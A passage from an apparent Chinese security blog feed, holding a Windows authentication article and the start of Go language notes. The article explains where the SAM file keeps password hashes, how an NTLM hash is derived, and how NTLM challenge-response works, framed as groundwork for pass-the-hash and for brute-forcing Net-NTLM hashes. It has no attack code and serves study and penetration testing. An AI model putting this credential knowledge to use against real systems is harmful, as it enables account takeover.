href="https://daiker.gitbook.io/windows-protocol/kerberos">https://daiker.gitbook.io/windows-protocol/kerberos</a></p><p><a href="https://payloads.online/archivers/2018-11-30/1/">https://payloads.online/archivers/2018-11-30/1/</a></p><p><a href="https://www.cnblogs.com/0x7e/p/13862453.html">https://www.cnblogs.com/0x7e/p/13862453.html</a></p><p><a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Kerberos域认证机制剖析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|Windows认证机制剖析</title>
    <link href="https://www.se7ensec.cn/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"/>
    <id>https://www.se7ensec.cn/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/</id>
    <published>2021-10-19T07:10:24.000Z</published>
    <updated>2021-10-20T18:04:21.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Windows认证机制剖析：本地，工作组，域环境。</p></blockquote><a id="more"></a><h1 id="本地认证（User-Login）"><a href="#本地认证（User-Login）" class="headerlink" title="本地认证（User Login）"></a>本地认证（User Login）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，操作系统中的密码存储在</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure><p>登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!</p><p>这个<strong>SAM文件</strong>中保留了计算机<strong>本地所有用户</strong>的凭证信息，可以理解为是一个数据库。</p><p><strong>※注意：Windows本身不保存明文密码，只保留密码的<a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin">Hash</a>。</strong></p><h2 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h2><blockquote><p>NTLM Hash的前身是LM Hash，由于存在安全缺陷已经被淘汰，无需做过多的了解，知道有这个东西即可</p></blockquote><p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(<span class="number">16</span>进制编码) = <span class="number">61646</span>d696e</span><br><span class="line"><span class="number">61646</span>d696e -&gt; Unicode = <span class="number">610064006</span>d0069006e00</span><br><span class="line"><span class="number">610064006</span>d0069006e00 -&gt; MD4 = <span class="number">209</span>c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.用户注销、重启、锁屏后</span><br><span class="line"><span class="number">2</span>.操作系统会让winlogon显示登录界面，也就是输入框</span><br><span class="line"><span class="number">3</span>.接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码</span><br><span class="line"><span class="number">4</span>.将明文密码加密成NTLM Hash，对SAM数据库比较认证</span><br></pre></td></tr></table></figure><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><h1 id="网络认证（Net-NTLM）"><a href="#网络认证（Net-NTLM）" class="headerlink" title="网络认证（Net NTLM）"></a>网络认证（Net NTLM）</h1><blockquote><p>工作组环境和域环境下Net NTLM认证过程因为有DC（域控制器）的参与流程略有差异，不过不影响我们进行哈希传递攻击，这里分开讲一下。</p></blockquote><h2 id="NTLM-协议概念"><a href="#NTLM-协议概念" class="headerlink" title="NTLM 协议概念"></a>NTLM 协议概念</h2><p><strong>这个协议只支持Windows</strong></p><p>NTLM是一种网络认证协议，全称是：<code>NT LAN Manager</code>，它是基于<strong>挑战（Challenge）/响应（Response）认证机制</strong>的一种认证模式。</p><p>NTLM网络认证协议是<strong>以NTLM Hash作为根本凭证</strong>进行认证的协议，消息的传输依赖于使用NTLM的上层协议，比如<code>SMB</code>，<code>LDAP</code>，<code>HTTP</code>等。</p><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><h3 id="NTLM协议认证过程"><a href="#NTLM协议认证过程" class="headerlink" title="NTLM协议认证过程"></a>NTLM协议认证过程</h3><ul><li><p><strong>协商</strong>：主要用于确认双方协议版本，NTLM存在V1和V2两个版本，具体区别就是加密方式不同，这个一般不用管。</p></li><li><p><strong>质询</strong>：就是挑战（Challenge）/响应（Response）认证机制起作用的范畴，也是认证机制的核心。</p></li><li><p><strong>验证</strong>：验证主要是在质询完成后验证结果，是认证的最后一步。</p></li></ul><h4 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h4><p><img src="https://p1.ssl.qhimg.com/t01ec11da7d0c1ee154.png" alt="img"></p><h4 id="质询"><a href="#质询" class="headerlink" title="质询"></a>质询</h4><ul><li>1.<code>Client</code>向<code>Server</code>发送用户信息(用户名)请求。</li><li>2.<code>Server</code>收到用户信息后判断该本地账户列表是否存在（不存在就返回认证失败），存在则生成一个16位的随机数(<strong><code>Challenge</code></strong>)， 然后使用登录用户名对应的<code>NTLM Hash</code>加密<code>Challenge</code>(16位随机字符)， 生成一个<code>Challenge1</code>(<code>Net-NTLM Hash</code>)存在内存中。同时，将<code>Challenge</code>(16位随机字符)发送给<code>Client</code>。</li><li>3.<code>Client</code>接受到服务器发送的<code>Challenge</code>后，使用将要登录到账户对应的<code>NTLM Hash</code>加密<code>Challenge</code>生成<code>Response</code>（<code>Net-NTLM Hash</code>），然后将<code>Response</code>发送至<code>Server</code>。</li></ul><blockquote><p><strong>这里引入了Net NTLM Hash</strong>：经过NTLM Hash加密Challenge的结果在网络协议中称之为<strong>Net NTLM Hash</strong>（不能直接用来进行哈希传递攻击，但可以通过暴力破解来获取明文密码）。</p><p>详细介绍：<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash</a></p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><code>Server</code>收到<code>Client</code>发送的<code>Response</code>（<code>Net-NTLM Hash</code>）后，与之前保存在内存中的<code>Challenge1</code>(<code>Net-NTLM Hash</code>)比较，如果相等则认证通过。</p><p>现在再来看一下这个认证过程，是不是清晰了很多</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.10.19/1.PNG" alt="作者倾旋"></p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><h3 id="NTLM协议认证过程-1"><a href="#NTLM协议认证过程-1" class="headerlink" title="NTLM协议认证过程"></a>NTLM协议认证过程</h3><blockquote><p>域环境下Net NTLM认证过程因为有DC（域控制器）的参与工作组下的流程略有差异。</p></blockquote><p><img src="https://p5.ssl.qhimg.com/t01d0dfdfd6d7007c80.png" alt="作者daiker"></p><p>①用户登录客户端电脑。</p><p>②<code>Client</code>向<code>Server</code>发送<strong>协商消息</strong>，它主要包含客户端支持和服务器请求的功能列表。</p><p>③<code>Server</code>用<strong>质询消息（Challenge）</strong>进行响应，这包含服务器支持和同意的功能列表。但是最重要的是，它包含<code>Server</code>产生的Challenge。</p><p>④<code>Client</code>用<strong>身份验证消息（Response）</strong>回复质询。用户接收到步骤③中的Challenge之后，使用用户hash与challenge进行加密运算得到Response，将<code>response</code>，<code>username</code>，<code>challeng</code>发给<code>Server</code>。消息中的<code>response</code>（Net-NTLM Hash）是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</p><p>⑤<code>Server</code>拿到<strong>身份验证消息（Response）</strong>后，使用challenge和用户hash进行加密得到<strong>response2</strong>与步骤③发来的<strong>response</strong>进行比较。</p><p>这时候，如果认证用户hash是存储在域控里面的话，那么本地没有认证用户hash，也就没办法计算response2，所以也就没法验证完成步骤⑤。<strong>所以<code>Server</code>就会通过<code>netlogon协议</code>联系域控</strong>，建立一个安全通道，然后将 <strong>协商消息</strong>，<strong>质询消息（Challenge）</strong>，<strong>身份验证消息（Response）</strong> 全部发给域控（这个过程也叫作<code>Pass Through Authentication</code>认证流程）。</p><p>⑥域控使用challenge和认证用户的hash进行加密得到response2，与type 3的response进行比较，判断是否一致。</p><p>⑦完成认证过程。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng</a></p><p><a href="https://payloads.online/archivers/2018-11-30/1/">https://payloads.online/archivers/2018-11-30/1/</a></p><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Windows认证机制剖析：本地，工作组，域环境。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Go语言学习笔记</title>
    <link href="https://www.se7ensec.cn/2021/09/27/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.se7ensec.cn/2021/09/27/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-27T00:16:18.000Z</published>
    <updated>2021-10-08T11:03:33.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考（Ctrl c+v） <a href="https://www.kancloud.cn/kancloud/the-way-to-go/">https://www.kancloud.cn/kancloud/the-way-to-go/</a></p></blockquote><p>当个学习笔记，只记录重点。</p><a id="more"></a><h1 id="初始"><a href="#初始" class="headerlink" title="初始"></a>初始</h1><h2 id="平台与架构"><a href="#平台与架构" class="headerlink" title="平台与架构"></a>平台与架构</h2><p>Go 语言开发团队开发了适用于以下操作系统的编译器：</p><ul><li>Linux</li><li>FreeBSD</li><li>Mac OS X（也称为 Darwin）</li></ul><p>目前有2个版本的编译器：Go 原生编译器 gc 和非原生编译器 gccgo，这两款编译器都是在类 Unix 系统下工作 。其中，gc 版本的编译器已经被移植到 Windows 平台上，并集成在主要发行版中，你也可以通过安装 MinGW 从而在 Windows 平台下使用 gcc 编译器。这两个编译器都是以单通道的形式工作。</p><p>你可以获取以下平台上的 Go 1.4 源码和二进制文件：</p><ul><li>Linux 2.6+：amd64、386 和 arm 架构</li><li>Mac OS X（Snow Leopard + Lion）：amd64 和 386 架构</li><li>Windows 2000+：amd64 和 386 架构</li></ul><h2 id="Go-环境变量"><a href="#Go-环境变量" class="headerlink" title="Go 环境变量"></a>Go 环境变量</h2><ul><li><strong>$GOROOT</strong> 表示 Go 在你的电脑上的安装位置，它的值一般都是 <code>$HOME/go</code>，当然，你也可以安装在别的地方。</li><li><strong>$GOARCH</strong> 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。</li><li><strong>$GOOS</strong> 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。</li><li><strong>$GOBIN</strong> 表示编译器和链接器的安装位置，默认是 <code>$GOROOT/bin</code>，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。</li></ul><h2 id="安装目录清单"><a href="#安装目录清单" class="headerlink" title="安装目录清单"></a>安装目录清单</h2><ul><li><code>/bin</code>：包含可执行文件，如：编译器，Go 工具</li><li><code>/doc</code>：包含示例程序，代码工具，本地文档等</li><li><code>/lib</code>：包含文档模版</li><li><code>/misc</code>：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例</li><li><code>/os_arch</code>：包含标准库的包的对象文件（<code>.a</code>）</li><li><code>/src</code>：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言）</li><li><code>/src/cmd</code>：包含 Go 和 C 的编译器和命令行脚本</li></ul><h2 id="Go调试器"><a href="#Go调试器" class="headerlink" title="Go调试器"></a>Go调试器</h2><ol><li>在合适的位置使用打印语句输出相关变量的值（<code>print</code>/<code>println</code> 和 <code>fmt.Print</code>/<code>fmt.Println</code>/<code>fmt.Printf</code>）。</li><li>在 <code>fmt.Printf</code> 中使用下面的说明符来打印有关变量的相关信息：<ul><li><code>%+v</code> 打印包括字段在内的实例的完整信息</li><li><code>%#v</code> 打印包括字段和限定类型名称在内的实例的完整信息</li><li><code>%T</code> 打印某个类型的完整说明</li></ul></li><li>使用 panic 语句（第 13.2 节）来获取栈跟踪信息（直到 panic 时所有被调用函数的列表）。</li><li>使用关键字 defer 来跟踪代码执行过程（第 6.4 节）。</li></ol><h2 id="构建并运行-Go-程序"><a href="#构建并运行-Go-程序" class="headerlink" title="构建并运行 Go 程序"></a>构建并运行 Go 程序</h2><p>在大多数 IDE 中，每次构建程序之前都会自动调用源码格式化工具 <code>gofmt</code> 并保存格式化后的源文件。如果构建成功则不会输出任何信息，而当发生编译时错误时，则会指明源码中具体第几行出现了什么错误，如：<code>a declared and not used</code>。一般情况下，你可以双击 IDE 中的错误信息直接跳转到发生错误的那一行。</p><p>如果程序执行一切顺利并成功退出后，将会在控制台输出 <code>Program exited with code 0</code>。</p><p>从 Go 1 版本开始，使用 Go 自带的更加方便的工具来构建应用程序：</p><ul><li><code>go build</code> 编译并安装自身包和依赖包</li><li><code>go install</code> 安装自身包和依赖包</li></ul><h1 id="语言的核心结构与技术"><a href="#语言的核心结构与技术" class="headerlink" title="语言的核心结构与技术"></a>语言的核心结构与技术</h1><h2 id="基本结构和基本数据类型"><a href="#基本结构和基本数据类型" class="headerlink" title="基本结构和基本数据类型"></a>基本结构和基本数据类型</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包的概念"><a href="#包的概念" class="headerlink" title="包的概念"></a>包的概念</h3><p>包是结构化代码的一种方式：每个程序都由包（通常简称为 pkg）的概念组成，可以使用自身的包或者从其它包中导入内容。</p><p><code>package main</code>表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 <code>main</code> 的包。</p><p>所有的包名都应该使用<strong>小写字母</strong>。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p> <code>//</code> 单行注释<br> <code>/* xxxx */</code> 多行注释</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>你可以在括号 <code>()</code> 中写入 0 个或多个函数的参数（使用逗号 <code>,</code> 分隔），每个参数的名称后面必须紧跟着该参数的类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> a + b &#125;</span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>基本类型：<code>int</code>、<code>float</code>、<code>bool</code>、<code>string</code></p><p>结构化的（复合的）：<code>struct</code>、<code>array</code>、<code>slice</code>、<code>map</code>、<code>channel</code></p><p>结构化的类型没有真正的值，它使用<code>nil</code>作为默认值</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>类型 B 的值 = 类型 B(类型 A 的值)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valueOfTypeB = typeB(valueOfTypeA)</span><br></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> beef, two, c = “meat”, <span class="number">2</span>, “veg”</span><br><span class="line"><span class="keyword">const</span> Monday, Tuesday, Wednesday, Thursday, Friday, Saturday = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    Monday, Tuesday, Wednesday = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">    Thursday, Friday, Saturday = <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明变量时将变量的 类型 放在变量的 名称之后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></span><br><span class="line"></span><br><span class="line">多行根据变量的值来自动推断其类型</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    a = <span class="number">15</span></span><br><span class="line">    b = <span class="literal">false</span></span><br><span class="line">    str = <span class="string">&quot;Go says hello to the world!&quot;</span></span><br><span class="line">    numShips = <span class="number">50</span></span><br><span class="line">    city <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">并行\同时赋值</span><br><span class="line">a, b, c = <span class="number">5</span>, <span class="number">7</span>, <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line">值交换</span><br><span class="line">a, b = b, a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>变量的 <strong>命名规则</strong> 遵循骆驼命名法，即首个单词小写，每个新单词的首字母大写，例如：<code>numShips</code> 和 <code>startDate</code></p><p>一个变量（常量、类型或函数）在程序中都有一定的作用范围，称之为作用域。</p><p>如果一个变量在<strong>函数体外</strong>声明，则被认为是<strong>全局变量</strong>，可以在<strong>整个包、外部包（被导出后）</strong>使用，不管你声明在哪个源文件里或在哪个源文件里调用该变量。</p><p>在<strong>函数体内</strong>声明的变量称之为<strong>局部变量</strong>，它们的作用域只在<strong>函数体内</strong>，参数和返回值变量也是局部变量。</p><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><p>函数 <code>fmt.Print</code> 和 <code>fmt.Println</code> 会自动使用格式化标识符 <code>%v</code> 对字符串进行格式化，两者都会在每个参数之间自动增加空格，而后者还会在字符串的最后加上一个换行符。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fmt.Print(<span class="string">&quot;Hello:&quot;</span>, <span class="number">23</span>)</span><br><span class="line">将输出：</span><br><span class="line">Hello: <span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="init-函数"><a href="#init-函数" class="headerlink" title="init 函数"></a>init 函数</h3><p>变量除了可以在全局声明中初始化，也可以在 init 函数中初始化。</p><p>不能够被人为调用，而是在每个包完成初始化后自动执行，并且执行优先级比 main 函数高。</p><p>一个源文件都可以包含且只包含一个 init 函数。初始化总是以单线程执行，并且按照包的依赖关系顺序执行。</p><p>init.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> trans</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Pi <span class="keyword">float64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   Pi = <span class="number">4</span> * math.Atan(<span class="number">1</span>) <span class="comment">// init() function computes Pi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user_init.go 中导入了包 trans（在相同的路径中）并且使用到了变量 Pi</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;./trans&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> twoPi = <span class="number">2</span> * trans.Pi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;2*Pi = %g\n&quot;</span>, twoPi) <span class="comment">// 2*Pi = 6.283185307179586</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本类型和运算符"><a href="#基本类型和运算符" class="headerlink" title="基本类型和运算符"></a>基本类型和运算符</h3><p><strong>布尔类型 bool：</strong>布尔型的值只可以是常量 true 或者 false</p><p><strong>数字类型：</strong>整型 int 和浮点型 float</p><p><strong>格式化说明符：</strong>格式化字符串里，<code>%d</code> 用于格式化整数（<code>%x</code> 和 <code>%X</code> 用于格式化 16 进制表示的数字），<code>%g</code> 用于格式化浮点型（<code>%f</code> 输出浮点数，<code>%e</code> 输出科学计数表示法），<code>%0d</code> 用于规定输出定长的整数，其中开头的数字 0 是必须的。</p><p><strong>数字值转换：</strong>进行<code>a32bitInt = int32(a32Float)</code> 的转换时，小数点后的数字将被丢弃。</p><p><strong>复数：</strong>Go 拥有以下复数类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">complex64</span> (<span class="number">32</span> 位实数和虚数)</span><br><span class="line"><span class="keyword">complex128</span> (<span class="number">64</span> 位实数和虚数)</span><br></pre></td></tr></table></figure><p><strong>位运算：</strong></p><p>一元运算符：按位补足 <code>^</code>，位左移 <code>&lt;&lt;</code>，位右移 <code>&gt;&gt;</code></p><p>二元运算符：按位与 <code>&amp;</code>，按位或 <code>|</code>，按位异或 <code>^</code>，位清除 <code>&amp;^</code></p><p>逻辑运算符：<code>==</code> , <code>!=</code> , <code>&lt;</code> , <code>&lt;=</code> , <code>&gt;</code> , <code>&gt;=</code></p><p>算术运算符：常见可用于整数和浮点数的二元运算符有 <code>+</code>、<code>-</code>、<code>*</code> 和 <code>/</code>。</p><p>运算符与优先级：</p><p>有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">优先级   运算符</span><br><span class="line"> <span class="number">7</span>      ^ !</span><br><span class="line"> <span class="number">6</span>      * / % &lt;&lt; &gt;&gt; &amp; &amp;^</span><br><span class="line"> <span class="number">5</span>      + - | ^</span><br><span class="line"> <span class="number">4</span>      == != &lt; &lt;= &gt;= &gt;</span><br><span class="line"> <span class="number">3</span>      &lt;-</span><br><span class="line"> <span class="number">2</span>      &amp;&amp;</span><br><span class="line"> <span class="number">1</span>      ||</span><br></pre></td></tr></table></figure><p>当然，你可以通过使用括号来临时提升某个表达式的整体运算优先级。</p><p><strong>类型别名：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TZ <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><strong>字符类型：</strong>char.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">int</span> = <span class="string">&#x27;\u0041&#x27;</span></span><br><span class="line"><span class="keyword">var</span> ch2 <span class="keyword">int</span> = <span class="string">&#x27;\u03B2&#x27;</span></span><br><span class="line"><span class="keyword">var</span> ch3 <span class="keyword">int</span> = <span class="string">&#x27;\U00101234&#x27;</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d - %d - %d\n&quot;</span>, ch, ch2, ch3) <span class="comment">// integer</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%c - %c - %c\n&quot;</span>, ch, ch2, ch3) <span class="comment">// character</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%X - %X - %X\n&quot;</span>, ch, ch2, ch3) <span class="comment">// UTF-8 bytes</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%U - %U - %U&quot;</span>, ch, ch2, ch3) <span class="comment">// UTF-8 code point</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">65</span> - <span class="number">946</span> - <span class="number">1053236</span></span><br><span class="line">A - β - r</span><br><span class="line"><span class="number">41</span> - <span class="number">3</span>B2 - <span class="number">101234</span></span><br><span class="line">U+<span class="number">0041</span> - U+<span class="number">03</span>B2 - U+<span class="number">101234</span></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><code>string</code> 类型的零值为长度为零的字符串，即空字符串 <code>&quot;&quot;</code>。</p><p>一般的比较运算符（<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&lt;=</code>、<code>&gt;=</code>、<code>&gt;</code>）通过在内存中按字节比较来实现字符串的对比。你可以通过函数<code>len()</code> 来获取字符串所占的字节长度，例如：<code>len(str)</code>。</p><p>字符串拼接符 <code>+</code>：两个字符串 <code>s1</code> 和 <code>s2</code> 可以通过 <code>s := s1 + s2</code> 、<code>s += &quot;world&quot;</code> 拼接在一起。</p><ul><li><p>解释字符串：</p><p>该类字符串使用双引号括起来，其中的相关的转义字符将被替换，这些转义字符包括：</p><ul><li><code>\n</code>：换行符</li><li><code>\r</code>：回车符</li><li><code>\t</code>：tab 键</li><li><code>\u</code> 或 <code>\U</code>：Unicode 字符</li><li><code>\\</code>：反斜杠自身</li></ul></li><li><p>非解释字符串：</p><p>该类字符串使用反引号括起来，支持换行，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;This is a raw string \n&#96; 